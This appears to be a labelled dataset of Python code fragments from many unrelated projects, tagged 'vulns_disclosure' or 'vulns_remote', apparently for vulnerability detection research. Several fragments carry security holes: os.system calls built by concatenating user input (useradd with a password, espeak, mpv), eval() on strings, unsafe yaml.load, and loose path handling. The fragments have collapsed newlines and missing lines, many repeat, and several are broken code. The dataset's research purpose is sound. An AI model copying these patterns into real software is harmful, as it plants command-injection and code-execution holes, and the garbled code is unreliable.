settingspath = os.getcwd() + '/test2.txt',vulns_disclosure
"    cost = [[0]*len(matrix[0]) for i in range(len(matrix[0]))]    print cost    print n    routes = [[0]*len(matrix[0]) for i in range(len(matrix[0]))]    for row in range(len(matrix[0])):        route = []        for i in range(row):            route.append(i)    for i in range(0,len(matrix[0])):        for j in range(0,len(matrix[0])):            if(i==0 or j==0):                cost[i][j] = 1                cost[i][j] = (cost[i-1][j]+cost[i][j-1])",vulns_disclosure
"    window=GraphWin(""Crowd Simulation"",width=400, height=400)    window.setCoords(0,0,40,40)",vulns_disclosure
"        poi2 = Point(poi[0][0] + 5, poi[0][1] + 5)",vulns_disclosure
"    dim = 4            b.append(l*dim+m)    print a    traverSeMatrix(a,0,0,dim,dim,path)       ",vulns_disclosure
"    return ophandlers.makeJump(pair[0], symbols, self.symId)",vulns_disclosure
          self.instrPtr = item[-1],vulns_disclosure
"          stop = ep1.takeJumpPath(result[0], self.symbols)          if stop:            return [self]          else:            print(""splitting"")            return [self, ep1]",vulns_disclosure
"        ophandlers.handleDupOp(op,                               self.symbols,                               self.stack,                               self.symId)",vulns_disclosure
      stop = self.instrPtr >= len(self.opcodes),vulns_disclosure
"      params.insert(0, int(p, 16))      params.insert(0, p)  if params[0] > 0 and params[1] > 0:",vulns_disclosure
"      params.insert(0, int(p, 16))      params.insert(0, p)",vulns_disclosure
    stack.append(val),vulns_disclosure
                    a_tag = element.find('a'),vulns_disclosure
"            print(title.getText())            wiki = self.parse_html(div)            if not wiki or wiki in cycle_check:                self.invalid_path += 1            cycle_check.add(wiki)            wiki_topic = wiki.split(""/wiki/"")[1]            url = self.build_url(wiki, False)            path_length += 1",vulns_disclosure
"    wiki = ""Art""",vulns_disclosure
"                indexList = self.findInstructionIndex(instructions,"".method public openFile\(Landroid\/net\/Uri;Ljava\/lang\/String;\)Landroid\/os\/ParcelFileDescriptor;"")                    indexList = self.findInstructionIndex(instructions,""Ljava\/io\/File;->getCanonicalPath\(\)"")",vulns_disclosure
"def isopen(location):    x, y = location    num = x*x + 3*x + 2*x*y + y + y*y + 1358    return x >= 0 and y >= 0 and bin(num).count('1') % 2 == 0def search(*, start=(1, 1), target=(5000, 5000), count=0):    q = deque([start])    costs = {start: 0}",vulns_disclosure
            if isopen(neighbor):                if neighbor == target:                    return cost                if neighbor not in costs or costs[neighbor] > cost:                    costs[neighbor] = cost                    q.append(neighbor),vulns_disclosure
from django.core.exceptions import ObjectDoesNotExist,vulns_disclosure
    },vulns_disclosure
from django.core.exceptions import ObjectDoesNotExist,vulns_disclosure
"from .common import get_and_check_project, get_tile_json",vulns_disclosure
class TaskAssets(TaskNestedView):,vulns_disclosure
                raise exceptions.NotFound(),vulns_disclosure
"from .tasks import TaskViewSet, TaskTiles, TaskTilesJson, TaskAssets",vulns_disclosure
"    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/download/(?P<asset>[^/.]+)/$', TaskAssets.as_view()),",vulns_disclosure
from django.core.exceptions import ObjectDoesNotExist,vulns_disclosure
    },vulns_disclosure
from django.core.exceptions import ObjectDoesNotExist,vulns_disclosure
"from .common import get_and_check_project, get_tile_json",vulns_disclosure
class TaskAssets(TaskNestedView):,vulns_disclosure
                raise exceptions.NotFound(),vulns_disclosure
"from .tasks import TaskViewSet, TaskTiles, TaskTilesJson, TaskAssets",vulns_disclosure
"    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/download/(?P<asset>[^/.]+)/$', TaskAssets.as_view()),",vulns_disclosure
from django.core.exceptions import ObjectDoesNotExist,vulns_disclosure
    },vulns_disclosure
from django.core.exceptions import ObjectDoesNotExist,vulns_disclosure
"from .common import get_and_check_project, get_tile_json",vulns_disclosure
class TaskAssets(TaskNestedView):,vulns_disclosure
                raise exceptions.NotFound(),vulns_disclosure
"from .tasks import TaskViewSet, TaskTiles, TaskTilesJson, TaskAssets",vulns_disclosure
"    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/download/(?P<asset>[^/.]+)/$', TaskAssets.as_view()),",vulns_disclosure
from django.core.exceptions import ObjectDoesNotExist,vulns_disclosure
    },vulns_disclosure
from django.core.exceptions import ObjectDoesNotExist,vulns_disclosure
"from .common import get_and_check_project, get_tile_json",vulns_disclosure
class TaskAssets(TaskNestedView):,vulns_disclosure
                raise exceptions.NotFound(),vulns_disclosure
"from .tasks import TaskViewSet, TaskTiles, TaskTilesJson, TaskAssets",vulns_disclosure
"    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/download/(?P<asset>[^/.]+)/$', TaskAssets.as_view()),",vulns_disclosure
from django.core.exceptions import ObjectDoesNotExist,vulns_disclosure
    },vulns_disclosure
from django.core.exceptions import ObjectDoesNotExist,vulns_disclosure
"from .common import get_and_check_project, get_tile_json",vulns_disclosure
class TaskAssets(TaskNestedView):,vulns_disclosure
                raise exceptions.NotFound(),vulns_disclosure
"from .tasks import TaskViewSet, TaskTiles, TaskTilesJson, TaskAssets",vulns_disclosure
"    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/download/(?P<asset>[^/.]+)/$', TaskAssets.as_view()),",vulns_disclosure
"                s = ""DNR""            else:                s = ""RUN""            s += ""_{}"".format(obj.id)            return s                ""red"" if getattr(n['node_object'], 'status', 'N/A') == 'running' else ""black"",",vulns_disclosure
"        gv_file = open('/tmp/graph.gv', 'w')",vulns_disclosure
                        break                if all_parents_dnr:,vulns_disclosure
"    license_dirs = [ ""preferred"", ""other"", ""exceptions"" ]",vulns_disclosure
"    license_dirs = [ ""preferred"", ""other"", ""exceptions"" ]",vulns_disclosure
"def _is_package(directory):    base = os.path.splitext(os.path.basename(file))[0]    name = [base] if base != '__init__' else []    parent = None    while current != parent and _is_package(current):        parent = os.path.dirname(current)        name.append(os.path.basename(current))        current = parent    return current, '.'.join(reversed(name))",vulns_disclosure
__version__ = '0.1.4',vulns_disclosure
__version__ = '0.1.4',vulns_disclosure
"    def undot(self, path):        ret = []        for node in path.split(""/""):            if node in ["""", "".""]:                continue            if node == "".."":                if ret:                    ret.pop()                continue            ret.append(node)        return ""/"".join(ret)        vpath = self.undot(vpath)",vulns_disclosure
        self.sr = conn.sr        self.bufsz = 1024 * 32        self.ok = True,vulns_disclosure
"        self.headers = {}            self.log(""bad headers:\n"" + ""\n"".join(headerlines))            return False",vulns_disclosure
"                if v == ""x"":                    break                if not v in self.auth.iuser:                    msg = u'bad_cpwd ""{}""'.format(v)                    nuke = u""Set-Cookie: cppwd=x; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT""                    self.loud_reply(msg, headers=[nuke])                    return True                self.uname = self.auth.iuser[v]",vulns_disclosure
"        if self.req.startswith(""/.cpr/""):            static_path = os.path.join(E.mod, ""web"", self.req.split(""?"")[0][6:])        args = {}        vpath = self.req[1:]        if ""?"" in vpath:            vpath, arglist = vpath.split(""?"", 1)            for k in arglist.split(""&""):                if ""="" in k:                    k, v = k.split(""="", 1)                    args[k.lower()] = v.strip()                else:                    args[k.lower()] = True        if vpath == """" and not args:                    vpath = self.rvol[0]                    vpath = self.wvol[0]        readable = vpath in self.rvol        writable = vpath in self.wvol            self.log(""inaccessible: {}"".format(vpath))            args = {""h""}        self.vpath = vpath        self.args = args",vulns_disclosure
"        if not pwd in self.auth.iuser:            h = [u""Set-Cookie: cppwd=x; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT""]            self.loud_reply(u'bad_ppwd ""{}""'.format(pwd), headers=h)            h = [""Set-Cookie: cppwd={}; Path=/"".format(pwd)]            self.loud_reply(u""login_ok"", headers=h)",vulns_disclosure
sys.path.append(os.path.join(os.path.dirname(__file__)))import logging,vulns_disclosure
"    try:      with open(filename, 'r', encoding='utf-8') as theFile:          full_contents = theFile.read()          theFile.close()    except: # file name not exist      return None",vulns_disclosure
      title = full_contents.split('\n')[0]      first_line = full_contents[:150] # not used now       first_line = first_line.split('------------')[0] # not used now ,vulns_disclosure
    this_meta = NodeMetadata(filename),vulns_disclosure
"    root_file = Urtext.UrtextFile(os.path.join(self.path, self.view.file_name()))    root_meta = NodeMetadata(os.path.join(self.path, root_file.filename))",vulns_disclosure
"      links = re.findall('->\s+(?!http)([\w\.\/]+)',contents) # link RegEx      return links",vulns_disclosure
"        child_metadata = NodeMetadata(os.path.join(self.path, link))      link = link.split('/')[-1]      child_metadata = NodeMetadata(os.path.join(self.path, link))",vulns_disclosure
"      files =Urtext.get_all_files(self.view.window())        if file[-4:] == '.txt':            with open(os.path.join(self.path, file),'r',encoding='utf-8') as this_file:              try:                contents = this_file.read() # in case there's a binary file in there or something.              except:                continue              links = re.findall('-> '+ filename.replace('.txt',''), contents) # link RegEx              for link in links:                links_to_file.append(file)    print(parent)    print(parent_filename)      print(link)",vulns_disclosure
"      if file[-4:] == '.txt':        metadata = NodeMetadata(os.path.join(Urtext.get_path(self.view.window()), file))        for tag in metadata.get_tag('tags'):          if isinstance(tag, str):            tag = [ tag ]          for item in tag:            if item not in self.found_tags: # this is incredibly ugly code. Redo it.              self.found_tags.append(item)              self.tagged_files[item] = []            self.tagged_files[item].append(metadata) # append the full file so title can be shown with filename",vulns_disclosure
"      link = re.findall('->\s+([^\|]+)',full_line) # allows for spaces and symbols in filenames, spaces stripped later      if len(link) > 0 :        path = Urtext.get_path(view.window())        try:          file_view = window.open_file(os.path.join(path, link[0].strip()) , sublime.TRANSIENT)          file_view.set_scratch(True)        except:          print('unable to open '+link[0])  def return_to_left(self, view,return_view):",vulns_disclosure
"  def __init__(self, filename):    self.path = os.path.dirname(filename)    self.title = re.search(r'[^\d]+|$',filename).group(0).strip()    self.log()",vulns_disclosure
    file = UrtextFile(filename),vulns_disclosure
          print(node_id),vulns_disclosure
            urtext_file = UrtextFile(self.sorted_menu[index][2]),vulns_disclosure
          file_info = UrtextFile(filename),vulns_disclosure
"from os.path import (    basename,    join,    relpath,)",vulns_disclosure
"            rel_path = relpath(path, self.base_directory_path)            path_basename = basename(path)            if rel_path != '.' and not self.directory_filter(path_basename):                continue",vulns_disclosure
"from os.path import (normcase, join)",vulns_disclosure
        return MOCK_PATHS,vulns_disclosure
        return 'dir2' not in path,vulns_disclosure
"    for _, _, file_list in os.walk(args.directory):                    args.directory, raut_module,",vulns_disclosure
"    if isinstance(base, six.text_type):        base = base.encode('utf-8')                if isinstance(id, six.text_type):                    id = id.encode('utf-8')                paths.insert(idx + 1, path + b'/' + id)",vulns_disclosure
"        self._r_steps_.append((f"".{attr_name}"", roamer))        self._r_steps_.append((item_desc, roamer))        last_found_step = None, None, None            desc, roamer = step            if roamer != MISSING:                last_found_step = i, desc, roamer            desc, roamer = step            if roamer == MISSING:                return i, desc, roamer        return None, None, None",vulns_disclosure
"            _, _, last_found_roamer = self._last_found()            if last_found_roamer:                result.append(f"" at <{type(last_found_roamer()).__name__}>"")                last_found_data = last_found_roamer()",vulns_disclosure
                else:,vulns_disclosure
            return other._r_item_ == self._r_item_        return other == self._r_item_,vulns_disclosure
"            str(ex.value) == ""<RoamPathException: missing step 1 .x for path <dict>.x>""",vulns_disclosure
"            str(ex.value) == ""<RoamPathException: missing step 1 .x for path <dict>.x>""",vulns_disclosure
"            r(python_filmography)[:].writers.name[:]            == r(python_filmography)[:].writers.name            r(python_filmography)[:][""writers""][""name""][:]            == r(python_filmography)[:][""writers""][""name""]",vulns_disclosure
"                result = self.update_drive(src_drive=src_drive, parent=curr_folder, curr_folder=folder)                print (result)",vulns_disclosure
"        print (""Could not find file at <{0}> in <{1}>."".format(path))",vulns_disclosure
"        print (""Could not find folder at <{0}> in <{1}>."".format(path))    def update_info(self, src_drive, path, update_owner=False):        src_item = src_drive.get_file_via_path(path)        dest_item = self.get_file_via_path(path)",vulns_disclosure
        except KeyError:,vulns_disclosure
        except KeyError:,vulns_disclosure
        except KeyError:,vulns_disclosure
        except KeyError:,vulns_disclosure
"import common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd ",vulns_remote
"    os.system(""useradd -G docker,wheel -p ""+encPass+"" ""+username)",vulns_remote
"import common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd ",vulns_remote
"    os.system(""useradd -G docker,wheel -p ""+encPass+"" ""+username)",vulns_remote
"        return check_component(comp, self.session, self.logger)",vulns_remote
        if len(pids) < 3:,vulns_remote
from invenio.utils.url import make_user_agent_string,vulns_remote
"            text_lines = extractor.text_lines_from_url(entry,                                                       user_agent=make_user_agent_string(""BibClassify""))",vulns_remote
"    """"""Outputs keywords reading a local file. Arguments and output are the same    as for :see: get_keywords_from_text() """"""",vulns_remote
"    """"""Extract keywords from the list of strings",vulns_remote
"    """"""Find single keywords in the fulltext",vulns_remote
"            except TaxonomyError:                log.error(                    'We reset this composite keyword, so that it does not match anything. Please fix the taxonomy.')",vulns_remote
"""""""BibClassify text extractor.",vulns_remote
import tempfileimport urllib2,vulns_remote
"    """"""Checks if a document is a PDF file. Returns True if is is.""""""",vulns_remote
"        filetype = file_output.split("":"")[1]                  ""be unsupported. Please report this to cds.support@cern.ch."")    """"""Returns the fulltext of the local file.",vulns_remote
"    if not _is_english_text('\n'.join(lines)):        log.warning(""It seems the file '%s' is unvalid and doesn't ""                    ""contain text. Please communicate this file to the Invenio ""                    ""team."" % document)    line_nb = len(lines)    word_nb = 0    for line in lines:        word_nb += len(re.findall(""\S+"", line))    lines = [line for line in lines if _ONE_WORD.search(line) is not None]    if not remote:        log.info(""Local file has %d lines and %d words."" % (line_nb, word_nb))    return linesdef _is_english_text(text):    """"""    Checks if a text is correct english.    Computes the number of words in the text and compares it to the    expected number of words (based on an average size of words of 5.1    letters).    @param text_lines: the text to analyze    @type text_lines:  string    @return:           True if the text is English, False otherwise    @rtype:            Boolean    """"""    avg_word_length = 2.55 + 1    expected_word_number = float(len(text)) / avg_word_length    words = [word             for word in re.split('\W', text)             if word.isalpha()]    word_number = len(words)    return word_number > expected_word_numberdef text_lines_from_url(url, user_agent=""""):    """"""Returns the fulltext of the file found at the URL.""""""    request = urllib2.Request(url)    if user_agent:        request.add_header(""User-Agent"", user_agent)    try:        distant_stream = urlopen(request)        local_file = tempfile.mkstemp(prefix=""bibclassify."")[1]        local_stream = open(local_file, ""w"")        local_stream.write(distant_stream.read())        local_stream.close()    except:        log.error(""Unable to read from URL %s."" % url)        return None    else:        lines = text_lines_from_local_file(local_file, remote=True)        os.remove(local_file)        line_nb = len(lines)        word_nb = 0        for line in lines:            word_nb += len(re.findall(""\S+"", line))        log.info(""Remote file has %d lines and %d words."" % (line_nb, word_nb))        return lines    """"""Tests if an executable is available on the system.""""""",vulns_remote
from invenio.utils.url import make_user_agent_string,vulns_remote
"            text_lines = extractor.text_lines_from_url(entry,                                                       user_agent=make_user_agent_string(""BibClassify""))",vulns_remote
"    """"""Outputs keywords reading a local file. Arguments and output are the same    as for :see: get_keywords_from_text() """"""",vulns_remote
"    """"""Extract keywords from the list of strings",vulns_remote
"    """"""Find single keywords in the fulltext",vulns_remote
"            except TaxonomyError:                log.error(                    'We reset this composite keyword, so that it does not match anything. Please fix the taxonomy.')",vulns_remote
"""""""BibClassify text extractor.",vulns_remote
import tempfileimport urllib2,vulns_remote
"    """"""Checks if a document is a PDF file. Returns True if is is.""""""",vulns_remote
"        filetype = file_output.split("":"")[1]                  ""be unsupported. Please report this to cds.support@cern.ch."")    """"""Returns the fulltext of the local file.",vulns_remote
"    if not _is_english_text('\n'.join(lines)):        log.warning(""It seems the file '%s' is unvalid and doesn't ""                    ""contain text. Please communicate this file to the Invenio ""                    ""team."" % document)    line_nb = len(lines)    word_nb = 0    for line in lines:        word_nb += len(re.findall(""\S+"", line))    lines = [line for line in lines if _ONE_WORD.search(line) is not None]    if not remote:        log.info(""Local file has %d lines and %d words."" % (line_nb, word_nb))    return linesdef _is_english_text(text):    """"""    Checks if a text is correct english.    Computes the number of words in the text and compares it to the    expected number of words (based on an average size of words of 5.1    letters).    @param text_lines: the text to analyze    @type text_lines:  string    @return:           True if the text is English, False otherwise    @rtype:            Boolean    """"""    avg_word_length = 2.55 + 1    expected_word_number = float(len(text)) / avg_word_length    words = [word             for word in re.split('\W', text)             if word.isalpha()]    word_number = len(words)    return word_number > expected_word_numberdef text_lines_from_url(url, user_agent=""""):    """"""Returns the fulltext of the file found at the URL.""""""    request = urllib2.Request(url)    if user_agent:        request.add_header(""User-Agent"", user_agent)    try:        distant_stream = urlopen(request)        local_file = tempfile.mkstemp(prefix=""bibclassify."")[1]        local_stream = open(local_file, ""w"")        local_stream.write(distant_stream.read())        local_stream.close()    except:        log.error(""Unable to read from URL %s."" % url)        return None    else:        lines = text_lines_from_local_file(local_file, remote=True)        os.remove(local_file)        line_nb = len(lines)        word_nb = 0        for line in lines:            word_nb += len(re.findall(""\S+"", line))        log.info(""Remote file has %d lines and %d words."" % (line_nb, word_nb))        return lines    """"""Tests if an executable is available on the system.""""""",vulns_remote
from invenio.utils.url import make_user_agent_string,vulns_remote
"            text_lines = extractor.text_lines_from_url(entry,                                                       user_agent=make_user_agent_string(""BibClassify""))",vulns_remote
"    """"""Outputs keywords reading a local file. Arguments and output are the same    as for :see: get_keywords_from_text() """"""",vulns_remote
"    """"""Extract keywords from the list of strings",vulns_remote
"    """"""Find single keywords in the fulltext",vulns_remote
"            except TaxonomyError:                log.error(                    'We reset this composite keyword, so that it does not match anything. Please fix the taxonomy.')",vulns_remote
"""""""BibClassify text extractor.",vulns_remote
import tempfileimport urllib2,vulns_remote
"    """"""Checks if a document is a PDF file. Returns True if is is.""""""",vulns_remote
"        filetype = file_output.split("":"")[1]                  ""be unsupported. Please report this to cds.support@cern.ch."")    """"""Returns the fulltext of the local file.",vulns_remote
"    if not _is_english_text('\n'.join(lines)):        log.warning(""It seems the file '%s' is unvalid and doesn't ""                    ""contain text. Please communicate this file to the Invenio ""                    ""team."" % document)    line_nb = len(lines)    word_nb = 0    for line in lines:        word_nb += len(re.findall(""\S+"", line))    lines = [line for line in lines if _ONE_WORD.search(line) is not None]    if not remote:        log.info(""Local file has %d lines and %d words."" % (line_nb, word_nb))    return linesdef _is_english_text(text):    """"""    Checks if a text is correct english.    Computes the number of words in the text and compares it to the    expected number of words (based on an average size of words of 5.1    letters).    @param text_lines: the text to analyze    @type text_lines:  string    @return:           True if the text is English, False otherwise    @rtype:            Boolean    """"""    avg_word_length = 2.55 + 1    expected_word_number = float(len(text)) / avg_word_length    words = [word             for word in re.split('\W', text)             if word.isalpha()]    word_number = len(words)    return word_number > expected_word_numberdef text_lines_from_url(url, user_agent=""""):    """"""Returns the fulltext of the file found at the URL.""""""    request = urllib2.Request(url)    if user_agent:        request.add_header(""User-Agent"", user_agent)    try:        distant_stream = urlopen(request)        local_file = tempfile.mkstemp(prefix=""bibclassify."")[1]        local_stream = open(local_file, ""w"")        local_stream.write(distant_stream.read())        local_stream.close()    except:        log.error(""Unable to read from URL %s."" % url)        return None    else:        lines = text_lines_from_local_file(local_file, remote=True)        os.remove(local_file)        line_nb = len(lines)        word_nb = 0        for line in lines:            word_nb += len(re.findall(""\S+"", line))        log.info(""Remote file has %d lines and %d words."" % (line_nb, word_nb))        return lines    """"""Tests if an executable is available on the system.""""""",vulns_remote
        yaml_config = yaml.load(response.content),vulns_remote
"            value = section_data[key]            self.icinga_lines.append((""%s%-45s%s"" % (self.indent, key, self.value_to_icinga(value))))",vulns_remote
"        if isinstance(base, collections.Mapping):            if isinstance(value, collections.Mapping):                base[key] = update_dict(base.get(key, {}), value)                base[key] = head[key]        else:            base = {key: head[key]}",vulns_remote
"    os.system( ""espeak -w speech.wav \"""" + myText + ""\"" -s 130"" )",vulns_remote
"logging.basicConfig(level = logging.ERROR, format = '%(filename)s:%(funcName)s:%(lineno)d:%(message)s')",vulns_remote
                tab = f + ':' + n._v_pathname,vulns_remote
"            self._append('sr', '{}:{}:{}:{}'.format(s, self.rw[i], self.rs[i], self.rc[i]) if s else None)",vulns_remote
        log.debug('self.sr={}'.format(self.sr)),vulns_remote
"                    getattr(plt, '{}lim'.format(a))(eval(r))",vulns_remote
                try: o[k[1:]] = eval(v[i])                except: o[k[1:]] = v[i]            if b: return eval(b)            else: raise,vulns_remote
"            log.debug('saving plot to %n', n)",vulns_remote
            p = eval(self.fp[i]),vulns_remote
"_safe_globals = {""__builtins__"":None}",vulns_remote
"logging.basicConfig(level = logging.ERROR, format = '%(filename)s:%(funcName)s:%(lineno)d:%(message)s')",vulns_remote
                tab = f + ':' + n._v_pathname,vulns_remote
"            self._append('sr', '{}:{}:{}:{}'.format(s, self.rw[i], self.rs[i], self.rc[i]) if s else None)",vulns_remote
        log.debug('self.sr={}'.format(self.sr)),vulns_remote
"                    getattr(plt, '{}lim'.format(a))(eval(r))",vulns_remote
                try: o[k[1:]] = eval(v[i])                except: o[k[1:]] = v[i]            if b: return eval(b)            else: raise,vulns_remote
"            log.debug('saving plot to %n', n)",vulns_remote
            p = eval(self.fp[i]),vulns_remote
"_safe_globals = {""__builtins__"":None}",vulns_remote
"        return BaseRequest.session.post( _BuildUri( handler ),                                        data = ToUtf8Json( data ),                                        headers = _HEADERS,                                        timeout = timeout )        return BaseRequest.session.get( _BuildUri( handler ),                                        headers = _HEADERS,                                        timeout = timeout )                              data = ToUtf8Json( data ),                              headers = _HEADERS )                             headers = _HEADERS )",vulns_remote
    response = requests.get( _BuildUri( 'healthy' ) ),vulns_remote
"    self._temp_options_filename = None      self._temp_options_filename = options_file.name      json.dump( dict( self._user_options ), options_file )",vulns_remote
    utils.RemoveIfExists( self._temp_options_filename ),vulns_remote
"        return BaseRequest.session.post( _BuildUri( handler ),                                        data = ToUtf8Json( data ),                                        headers = _HEADERS,                                        timeout = timeout )        return BaseRequest.session.get( _BuildUri( handler ),                                        headers = _HEADERS,                                        timeout = timeout )                              data = ToUtf8Json( data ),                              headers = _HEADERS )                             headers = _HEADERS )",vulns_remote
    response = requests.get( _BuildUri( 'healthy' ) ),vulns_remote
"    self._temp_options_filename = None      self._temp_options_filename = options_file.name      json.dump( dict( self._user_options ), options_file )",vulns_remote
    utils.RemoveIfExists( self._temp_options_filename ),vulns_remote
"        return BaseRequest.session.post( _BuildUri( handler ),                                        data = ToUtf8Json( data ),                                        headers = _HEADERS,                                        timeout = timeout )        return BaseRequest.session.get( _BuildUri( handler ),                                        headers = _HEADERS,                                        timeout = timeout )                              data = ToUtf8Json( data ),                              headers = _HEADERS )                             headers = _HEADERS )",vulns_remote
    response = requests.get( _BuildUri( 'healthy' ) ),vulns_remote
"    self._temp_options_filename = None      self._temp_options_filename = options_file.name      json.dump( dict( self._user_options ), options_file )",vulns_remote
    utils.RemoveIfExists( self._temp_options_filename ),vulns_remote
"        return BaseRequest.session.post( _BuildUri( handler ),                                        data = ToUtf8Json( data ),                                        headers = _HEADERS,                                        timeout = timeout )        return BaseRequest.session.get( _BuildUri( handler ),                                        headers = _HEADERS,                                        timeout = timeout )                              data = ToUtf8Json( data ),                              headers = _HEADERS )                             headers = _HEADERS )",vulns_remote
    response = requests.get( _BuildUri( 'healthy' ) ),vulns_remote
"    self._temp_options_filename = None      self._temp_options_filename = options_file.name      json.dump( dict( self._user_options ), options_file )",vulns_remote
    utils.RemoveIfExists( self._temp_options_filename ),vulns_remote
"        return BaseRequest.session.post( _BuildUri( handler ),                                        data = ToUtf8Json( data ),                                        headers = _HEADERS,                                        timeout = timeout )        return BaseRequest.session.get( _BuildUri( handler ),                                        headers = _HEADERS,                                        timeout = timeout )                              data = ToUtf8Json( data ),                              headers = _HEADERS )                             headers = _HEADERS )",vulns_remote
    response = requests.get( _BuildUri( 'healthy' ) ),vulns_remote
"    self._temp_options_filename = None      self._temp_options_filename = options_file.name      json.dump( dict( self._user_options ), options_file )",vulns_remote
    utils.RemoveIfExists( self._temp_options_filename ),vulns_remote
            return yaml.load(raw_source),vulns_remote
    native = {'foo': 'bar'},vulns_remote
    native = {'foo': 'bar'},vulns_remote
    native = {'foo': 'bar'},vulns_remote
"        elif arg in ('--single-session',):",vulns_remote
         singlesession=args.single_session),vulns_remote
            wait_for_socket_server(addr),vulns_remote
        except EOFError:,vulns_remote
"    mpv = "" "".join(args.mpv)",vulns_remote
"            x = os.system(""mpv %(args)s %(link)s"" % {""link"": link, ""args"": mpv})            if x == 0:            elif x == 1024:",vulns_remote
dataset = pd.read_csv('Social_Network_Ads.csv'),vulns_remote
dataset = pd.read_csv('Data.csv'),vulns_remote
dataset = pd.read_csv('Churn_Modelling.csv'),vulns_remote
"onehotencoder = OneHotEncoder(categorical_features = [1])X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.2, random_state = 0)",vulns_remote
"classifier.add(Dense(units = 6, kernel_initializer = 'uniform', activation = 'relu', input_dim = 11))classifier.add(Dense(units = 6, kernel_initializer = 'uniform', activation = 'relu'))classifier.add(Dense(units = 1, kernel_initializer = 'uniform', activation = 'sigmoid'))classifier.compile(optimizer = 'adam', loss = 'binary_crossentropy', metrics = ['accuracy'])classifier.fit(X_train, y_train, batch_size = 10, epochs = 100)",vulns_remote
display = Display(),vulns_remote
        display.verbosity = self.options.verbosity,vulns_remote
"    def useradd(self, username, expiration=None):",vulns_remote
"    def useradd(self, username, expiration=None):",vulns_remote
"    def useradd(self, username, expiration=None):",vulns_remote
                            return,vulns_remote
        return self.ext_conf,vulns_remote
from datetime import timedelta,vulns_remote
from homeassistant.util import Throttle,vulns_remote
MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600),vulns_remote
"    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]",vulns_remote
"    @Throttle(MIN_TIME_BETWEEN_UPDATES)        """"""Call the Netatmo API to update the data.""""""        import pyatmo        self.station_data = pyatmo.WeatherStationData(self.auth)        if self.station is not None:            self.data = self.station_data.lastData(                station=self.station, exclude=3600)        else:            self.data = self.station_data.lastData(exclude=3600)",vulns_remote
from datetime import timedelta,vulns_remote
from homeassistant.util import Throttle,vulns_remote
MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600),vulns_remote
"    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]",vulns_remote
"    @Throttle(MIN_TIME_BETWEEN_UPDATES)        """"""Call the Netatmo API to update the data.""""""        import pyatmo        self.station_data = pyatmo.WeatherStationData(self.auth)        if self.station is not None:            self.data = self.station_data.lastData(                station=self.station, exclude=3600)        else:            self.data = self.station_data.lastData(exclude=3600)",vulns_remote
from datetime import timedelta,vulns_remote
from homeassistant.util import Throttle,vulns_remote
MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600),vulns_remote
"    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]",vulns_remote
"    @Throttle(MIN_TIME_BETWEEN_UPDATES)        """"""Call the Netatmo API to update the data.""""""        import pyatmo        self.station_data = pyatmo.WeatherStationData(self.auth)        if self.station is not None:            self.data = self.station_data.lastData(                station=self.station, exclude=3600)        else:            self.data = self.station_data.lastData(exclude=3600)",vulns_remote
from datetime import timedelta,vulns_remote
from homeassistant.util import Throttle,vulns_remote
MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600),vulns_remote
"    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]",vulns_remote
"    @Throttle(MIN_TIME_BETWEEN_UPDATES)        """"""Call the Netatmo API to update the data.""""""        import pyatmo        self.station_data = pyatmo.WeatherStationData(self.auth)        if self.station is not None:            self.data = self.station_data.lastData(                station=self.station, exclude=3600)        else:            self.data = self.station_data.lastData(exclude=3600)",vulns_remote
from datetime import timedelta,vulns_remote
from homeassistant.util import Throttle,vulns_remote
MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600),vulns_remote
"    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]",vulns_remote
"    @Throttle(MIN_TIME_BETWEEN_UPDATES)        """"""Call the Netatmo API to update the data.""""""        import pyatmo        self.station_data = pyatmo.WeatherStationData(self.auth)        if self.station is not None:            self.data = self.station_data.lastData(                station=self.station, exclude=3600)        else:            self.data = self.station_data.lastData(exclude=3600)",vulns_remote
"from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files",vulns_remote
"from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError",vulns_remote
"    def protected(self):        return self.exists and not os.access(self.file, os.W_OK)        if not self.exists and lstat(self.file):",vulns_remote
"    def touch(self):            lutime(self.file, None)",vulns_remote
"        return IOFile(apply_wildcards(f, wildcards,                      rule=self.rule)",vulns_remote
        return flag in value.flags,vulns_remote
"    annotated = flag(value, ""dynamic"")",vulns_remote
"from snakemake.io import IOFile, Wildcards, Resources, _IOFile",vulns_remote
"                    yield IOFile(f, self.rule)",vulns_remote
"0,",vulns_remote
"                        expansion[i].append(IOFile(e, rule=branch))",vulns_remote
"from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch",vulns_remote
"from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files",vulns_remote
"from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError",vulns_remote
"    def protected(self):        return self.exists and not os.access(self.file, os.W_OK)        if not self.exists and lstat(self.file):",vulns_remote
"    def touch(self):            lutime(self.file, None)",vulns_remote
"        return IOFile(apply_wildcards(f, wildcards,                      rule=self.rule)",vulns_remote
        return flag in value.flags,vulns_remote
"    annotated = flag(value, ""dynamic"")",vulns_remote
"from snakemake.io import IOFile, Wildcards, Resources, _IOFile",vulns_remote
"                    yield IOFile(f, self.rule)",vulns_remote
"0,",vulns_remote
"                        expansion[i].append(IOFile(e, rule=branch))",vulns_remote
